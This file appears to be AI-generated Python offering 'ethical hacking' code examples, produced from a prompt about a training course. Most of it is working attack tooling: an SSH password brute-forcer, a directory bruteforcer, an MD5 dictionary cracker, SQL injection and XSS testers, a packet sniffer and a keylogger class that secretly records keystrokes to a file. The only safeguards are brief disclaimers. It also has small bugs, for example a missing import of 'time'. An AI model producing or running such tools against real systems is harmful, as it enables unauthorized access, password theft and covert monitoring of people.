"""
Generated Code Metadata:
========================
Original URL: https://aptrongurgaon.in
Prompt: Provide code examples for ethical hacking techniques, such as penetration testing, based on APTRON Gurgaon’s Ethical Hacking course.
Generated: DETERMINISTIC_c7cb9246ba8def48
Batch ID: 20250612_151100
URLs Found: 0
Malicious URLs: 0

Oracle Results:
No URLs checked
"""

# Generated Code:
# ===============

```python
# Ethical Hacking Techniques - Penetration Testing Examples
# Note: These examples are for educational purposes only. 
# Always obtain proper authorization before testing any system.

import socket
import subprocess
import requests
from scapy.all import *
import nmap

# 1. Port Scanner using Socket
def port_scanner(target_ip, start_port, end_port):
    """
    Basic TCP port scanner to identify open ports on a target system
    """
    open_ports = []
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

# 2. Vulnerability Scanner using Nmap
def nmap_vulnerability_scan(target_ip):
    """
    Perform vulnerability scanning using Nmap with NSE scripts
    """
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=target_ip, arguments='-sV --script vulners')
        return nm.csv()
    except nmap.PortScannerError as e:
        print(f"Error in Nmap scan: {e}")
        return None

# 3. ARP Spoofing Detector using Scapy
def arp_spoof_detector(interface, gateway_ip):
    """
    Detect ARP spoofing attacks by monitoring ARP packets
    """
    def process_packet(packet):
        if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP response
            if packet[ARP].psrc == gateway_ip and packet[ARP].hwsrc != getmacbyip(gateway_ip):
                print(f"[!] ARP Spoofing detected! Fake MAC: {packet[ARP].hwsrc}")

    sniff(iface=interface, filter="arp", prn=process_packet, store=0)

# 4. Web Application Directory Bruteforcer
def dir_bruteforce(target_url, wordlist_path):
    """
    Brute force directories on a web application
    """
    try:
        with open(wordlist_path, 'r') as file:
            directories = [line.strip() for line in file]
        
        found_dirs = []
        for directory in directories:
            url = f"{target_url}/{directory}"
            response = requests.get(url)
            if response.status_code == 200:
                found_dirs.append(url)
        return found_dirs
    except Exception as e:
        print(f"Error during directory bruteforce: {e}")
        return []

# 5. Simple Keylogger (for educational purposes)
import keyboard
import threading

class Keylogger:
    def __init__(self):
        self.log = ""
        self.is_running = False

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"
        self.log += name

    def start(self):
        self.is_running = True
        keyboard.on_release(callback=self.callback)
        threading.Thread(target=self.report).start()

    def stop(self):
        self.is_running = False

    def report(self):
        while self.is_running:
            with open("keylog.txt", "a") as f:
                f.write(self.log)
                self.log = ""
            time.sleep(60)

# 6. Password Cracker (Dictionary Attack)
import hashlib

def password_cracker(target_hash, wordlist_path):
    """
    Perform dictionary attack against a password hash
    """
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as file:
            for password in file:
                password = password.strip()
                hashed_password = hashlib.md5(password.encode()).hexdigest()
                if hashed_password == target_hash:
                    return password
        return None
    except Exception as e:
        print(f"Error during password cracking: {e}")
        return None

# 7. Network Sniffer
def network_sniffer(interface, count=50):
    """
    Capture network packets on specified interface
    """
    packets = sniff(iface=interface, count=count)
    return packets

# 8. SQL Injection Tester
def sql_injection_tester(url, param, payloads):
    """
    Test for SQL injection vulnerabilities
    """
    vulnerable = False
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        response = requests.get(test_url)
        if "error in your SQL syntax" in response.text.lower():
            vulnerable = True
            break
    return vulnerable

# 9. SSH Brute Force (Educational Only)
import paramiko

def ssh_brute_force(host, username, wordlist_path, port=22):
    """
    SSH brute force attack (for authorized testing only)
    """
    try:
        with open(wordlist_path, 'r') as file:
            passwords = [line.strip() for line in file]
        
        for password in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(host, port=port, username=username, password=password, timeout=5)
                print(f"[+] Success! Password: {password}")
                ssh.close()
                return password
            except:
                continue
        return None
    except Exception as e:
        print(f"Error during SSH brute force: {e}")
        return None

# 10. XSS Vulnerability Scanner
def xss_scanner(url, param, payloads):
    """
    Test for XSS vulnerabilities
    """
    vulnerable = False
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            vulnerable = True
            break
    return vulnerable
```
